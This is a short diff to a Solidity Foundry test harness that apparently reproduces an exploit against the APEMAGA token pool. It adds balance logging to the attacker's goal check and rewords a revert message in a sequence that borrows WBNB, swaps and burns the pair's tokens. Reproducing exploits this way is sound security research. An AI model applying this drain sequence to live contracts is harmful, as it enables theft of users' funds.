@@ -130,7 +130,9 @@ contract APEMAGATestBase is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfwbnbattacker);
+        emit log_named_uint("FinalBalance", wbnb.balanceOf(attacker));
         return wbnb.balanceOf(attacker) >= 1e12 + balanceOfwbnbattacker;
     }
 
@@ -211,7 +213,7 @@ contract APEMAGATestBase is Test, BlockLoader {
         borrow_wbnb_owner(amt0);
         swap_pair_attacker_wbnb_apemaga(amt1, amt2);
         burn_apemaga_pair(amt3);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
